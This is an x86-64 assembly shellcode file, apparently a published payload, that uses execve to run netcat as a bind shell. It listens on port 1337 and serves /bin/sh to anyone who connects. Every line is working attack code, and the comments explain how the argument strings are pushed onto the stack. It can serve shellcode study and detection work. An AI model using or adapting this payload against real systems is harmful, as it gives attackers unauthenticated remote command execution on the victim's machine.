; File: shellcode-822_nc_traditional.nasm
; Author: Petr Javorik
; Size: 150 bytes


global _start

section .text

_start:

    xor     rdx, rdx                ; RDX = 0, char *const envp[] = NULL

    push rdx
    mov rdi, 0x6c616e6f69746964
    push rdi                        ; push 'lanoitid'
    mov rdi, 0x6172742e636e2f6e
    push rdi                        ; push 'art.cn/n'
    mov rdi, 0x69622f2f2f2f2f2f
    push rdi                        ; push 'ib//////'
    mov rdi, rsp                    ; RDI points to '//////bin/nc.traditional'

    mov rcx, 0x68732f6e69622fff     ; RCX = 'hs/nib/0xff'
    shr rcx, 0x08                   ; RCX = 'hs/nib/'
    push rcx
    mov rcx, rsp                    ; RCX points to '/bin/sh'

    mov rbx, 0x652dffffffffffff     ; RBX = 'e-0xffffffffffff'
    shr rbx, 0x30                   ; RBX = 'e-'
    push rbx
    mov rbx, rsp                    ; RBX points to '-e'

    mov r10, 0x37333331ffffffff     ; R10 = '73310xffffffff'
    shr r10, 0x20                   ; R10 = '7331'
    push r10
    mov r10, rsp                    ; R10 points to '1337'

    mov r9, 0x702dffffffffffff      ; R9 = 'p-0xffffffffffff'
    shr r9, 0x30                    ; R9 = 'p-'
    push r9
    mov r9, rsp                     ; R9 points to '-p'

    mov r8, 0x6c2dffffffffffff      ; R8 = 'l-0xffffffffffff'
    shr r8, 0x30                    ; R8 = 'l-'
    push r8
    mov r8, rsp                     ; R8 points to '-l'

    push rdx                        ;push NULL
    push rcx                        ;push address of '/bin/sh'
    push rbx                        ;push address of '-e'
    push r10                        ;push address of '1337'
    push r9                         ;push address of '-p'
    push r8                         ;push address of '-l'
    push rdi                        ;push address of '/bin/nc.traditional'

    mov rsi, rsp
    mov al, 59
    syscall

